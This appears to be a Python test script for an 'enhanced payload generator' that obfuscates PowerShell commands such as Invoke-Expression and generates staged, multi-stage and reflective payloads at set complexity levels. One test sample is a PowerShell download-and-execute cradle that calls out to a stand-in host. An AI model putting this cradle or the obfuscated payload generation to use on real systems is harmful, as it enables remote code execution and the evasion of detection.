#!/usr/bin/env python3
"""
Test script for the enhanced payload generator
Tests all new features and integration capabilities
"""

import sys
import traceback
from payload_generator_enhanced import EnhancedPayloadGenerator, AdvancedObfuscationEngine

def test_obfuscation_engine():
    """Test the AdvancedObfuscationEngine capabilities"""
    print("Testing AdvancedObfuscationEngine...")
    engine = AdvancedObfuscationEngine()
    
    # Test string obfuscation
    test_string = "Hello World"
    obfuscated = engine.obfuscate_string(test_string)
    print(f"Original: {test_string}")
    print(f"Obfuscated: {obfuscated}")
    
    # Test variable name morphing
    test_var = "myVariable"
    morphed = engine.morph_name(test_var)
    print(f"Original variable: {test_var}")
    print(f"Morphed variable: {morphed}")
    
    # Test command obfuscation
    test_command = "Invoke-Expression"
    obfuscated_cmd = engine.obfuscate_command(test_command)
    print(f"Original command: {test_command}")
    print(f"Obfuscated command: {obfuscated_cmd}")
    
    # Test Unicode letter generation
    unicode_letter = engine.random_unicode_letter()
    print(f"Random Unicode letter: {unicode_letter}")
    
    print("AdvancedObfuscationEngine tests completed!\n")

def test_enhanced_generator():
    """Test the EnhancedPayloadGenerator capabilities"""
    print("Testing EnhancedPayloadGenerator...")
    generator = EnhancedPayloadGenerator()
    
    # Test different complexity levels and payload types
    test_cases = [
        {"payload_type": "staged", "complexity_level": 3},
        {"payload_type": "multi_stage", "complexity_level": 5},
        {"payload_type": "reflective", "complexity_level": 7},
        {"payload_type": "traditional", "complexity_level": 9, "ultra_mode": True}
    ]
    
    for i, params in enumerate(test_cases, 1):
        print(f"\nTest Case {i}: {params['payload_type']}, complexity {params['complexity_level']}")
        try:
            payload_content = generator.generate_payload_content(
                payload_type=params['payload_type'],
                complexity_level=params['complexity_level'],
                ultra_mode=params.get('ultra_mode', False)
            )
            
            if payload_content:
                print(f"✓ Generated successfully")
                print(f"  Payload size: {len(payload_content)} bytes")
                print(f"  Complexity score: {generator.last_complexity_score}")
                print(f"  Ultra mode: {params.get('ultra_mode', False)}")
                
                # Show first 200 chars of payload
                payload_preview = payload_content[:200]
                print(f"  Preview: {payload_preview}...")
            else:
                print("✗ Generation failed")
                
        except Exception as e:
            print(f"✗ Error: {str(e)}")
            traceback.print_exc()

def test_template_types():
    """Test different enhanced template types"""
    print("\nTesting Enhanced Template Types...")
    generator = EnhancedPayloadGenerator()
    
    templates = [
        {"type": "quantum_staged", "complexity": 8},
        {"type": "neural_multi_stage", "complexity": 7}, 
        {"type": "holographic_reflective", "complexity": 6},
        {"type": "metamorphic_traditional", "complexity": 5}
    ]
    
    for template in templates:
        print(f"\nTesting template: {template['type']}")
        try:
            payload_content = generator.generate_payload_content(
                payload_type=template['type'],
                complexity_level=template['complexity']
            )
            
            if payload_content:
                print(f"✓ {template['type']} generated successfully")
                print(f"  Size: {len(payload_content)} bytes")
                print(f"  Preview: {payload_content[:150]}...")
            else:
                print(f"✗ {template['type']} generation failed")
                
        except Exception as e:
            print(f"✗ Error in {template['type']}: {str(e)}")

def test_complexity_scoring():
    """Test the complexity scoring system"""
    print("\nTesting Complexity Scoring System...")
    generator = EnhancedPayloadGenerator()
    
    test_payloads = [
        "Write-Host 'Hello'",  # Simple
        "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://test.com')",  # Medium
        generator.obfuscator.obfuscate_string("$a=[System.Text.Encoding]::UTF8.GetBytes('test'); [System.Convert]::ToBase64String($a)")  # Complex
    ]
    
    for i, payload in enumerate(test_payloads, 1):
        score = generator._calculate_enhanced_complexity_score(payload, 5)
        print(f"Payload {i} complexity score: {score}")
        print(f"  Sample: {payload[:80]}...")

def main():
    """Run all tests"""
    print("=== Enhanced Payload Generator Test Suite ===\n")
    
    try:
        test_obfuscation_engine()
        test_enhanced_generator()
        test_template_types()
        test_complexity_scoring()
        
        print("\n=== All tests completed successfully! ===")
        
    except Exception as e:
        print(f"\n=== Test suite failed with error: {str(e)} ===")
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
